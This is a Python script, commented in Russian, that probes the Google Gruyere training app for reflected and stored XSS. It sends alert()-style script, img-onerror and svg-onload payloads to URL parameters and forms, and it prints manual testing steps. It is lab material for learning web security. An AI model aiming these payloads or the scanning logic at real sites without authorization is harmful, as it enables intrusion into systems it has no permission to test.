import requests
from bs4 import BeautifulSoup
import os
from dotenv import load_dotenv

load_dotenv()
MY_ID = os.getenv("MY_ID")
BASE_URL = f"https://google-gruyere.appspot.com/{MY_ID}"

# Только самые основные payload'ы
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "\" onmouseover=\"alert('XSS')\"",
]

def test_reflected_xss_simple():
    """Простой тест reflected XSS"""
    print("\n🔍 Простой тест Reflected XSS")
    print("=" * 40)
    
    # Всего 3 тестовых URL - самые вероятные места
    test_cases = [
        f"{BASE_URL}/search?q=",      # Поиск
        f"{BASE_URL}/?q=",            # Главная с поиском
        f"{BASE_URL}/profile?name=",  # Профиль
    ]
    
    for test_url in test_cases:
        print(f"\n📄 Тестирую: {test_url}")
        
        # Пробуем только 2 payload'а на каждый URL
        for payload in XSS_PAYLOADS[:2]:
            try:
                # Кодируем для URL
                encoded_payload = requests.utils.quote(payload)
                full_url = test_url + encoded_payload
                
                # Делаем запрос
                response = requests.get(full_url, timeout=5)
                
                # Простая проверка - если payload в ответе
                if payload in response.text:
                    print(f"  ✅ Уязвимо! Payload отразился")
                    print(f"     Payload: {payload}")
                    print(f"     URL: {full_url[:80]}...")
                else:
                    print(f"  ❌ Не отразился: {payload[:20]}...")
                    
            except Exception as e:
                print(f"  ⚠️  Ошибка: {e}")

def test_stored_xss_simple():
    """Простой тест stored XSS"""
    print("\n🔍 Простой тест Stored XSS")
    print("=" * 40)
    
    # Создаем сессию
    session = requests.Session()
    
    # Пробуем получить главную страницу
    print("📄 Получаю главную страницу...")
    try:
        response = session.get(BASE_URL)
        
        # Ищем формы на главной
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        if not forms:
            print("  ⚠️  Формы не найдены на главной")
            return
        
        print(f"  Найдено форм: {len(forms)}")
        
        # Берем первую форму
        form = forms[0]
        form_action = form.get('action', BASE_URL)
        form_method = form.get('method', 'get').lower()
        
        print(f"  Тестирую форму: {form_method.upper()} {form_action}")
        
        # Находим текстовые поля
        text_fields = []
        for inp in form.find_all(['input', 'textarea']):
            inp_type = inp.get('type', 'text')
            inp_name = inp.get('name')
            
            if inp_type in ['text', 'textarea', 'search', None] and inp_name:
                text_fields.append(inp_name)
        
        if not text_fields:
            print("  ⚠️  Не найдены текстовые поля")
            return
        
        print(f"  Текстовые поля: {text_fields}")
        
        # Тестируем только первое поле
        field_to_test = text_fields[0]
        print(f"  Тестирую поле: '{field_to_test}'")
        
        # Пробуем только 1 payload
        payload = XSS_PAYLOADS[0]  # <script>alert('XSS')</script>
        
        # Готовим данные
        form_data = {field_to_test: payload}
        
        # Отправляем
        if form_method == 'post':
            result = session.post(form_action, data=form_data)
        else:
            result = session.get(form_action, params=form_data)
        
        print(f"  Отправлен payload: {payload}")
        
        # Простая проверка
        if payload in result.text:
            print(f"  ✅ PAYLOAD В ОТВЕТЕ! Возможна Stored XSS")
        else:
            print(f"  ❌ Payload не найден в ответе")
            
    except Exception as e:
        print(f"  ⚠️  Ошибка: {e}")

def quick_manual_test():
    """Быстрые инструкции для ручного тестирования"""
    print("\n🎯 БЫСТРЫЕ РУЧНЫЕ ТЕСТЫ")
    print("=" * 40)
    
    print("\n1. ФОРМА ПОИСКА (самая вероятная):")
    print(f"   Откройте: {BASE_URL}")
    print("   Найдите поле поиска")
    print("   Введите: <script>alert('test')</script>")
    print("   Нажмите 'Search'")
    print("   Должен появиться alert с 'test'")
    
    print("\n2. КОММЕНТАРИИ:")
    print("   Найдите любой сниппет")
    print("   Добавьте комментарий: <img src=x onerror=alert(1)>")
    print("   Обновите страницу - должен сработать alert")
    
    print("\n3. URL ПАРАМЕТРЫ:")
    print(f"   Откройте в браузере:")
    print(f"   {BASE_URL}/search?q=<svg onload=alert(1)>")
    print("   Если есть уязвимость - сразу появится alert")

def main():
    """Основная функция"""
    print("🎯 ПРОСТОЙ ТЕСТ XSS НА GOOGLE GRUYERE")
    print("=" * 50)
    
    if not MY_ID:
        print("❌ Ошибка: MY_ID не найден в .env")
        return
    
    print(f"🔗 Сайт: {BASE_URL}")
    
    # Запускаем тесты
    test_reflected_xss_simple()
    
    # Можно закомментировать, если не нужно тестировать формы
    # test_stored_xss_simple()
    
    # Показываем инструкции
    quick_manual_test()
    
    print("\n" + "=" * 50)
    print("📝 КРАТКИЙ ОТЧЕТ:")
    print("=" * 50)
    print("1. Если payload отразился в ответе - возможна Reflected XSS")
    print("2. Если payload сохранился (виден после обновления) - Stored XSS")
    print("3. Делайте скриншоты всех успешных тестов")

if __name__ == "__main__":
    main()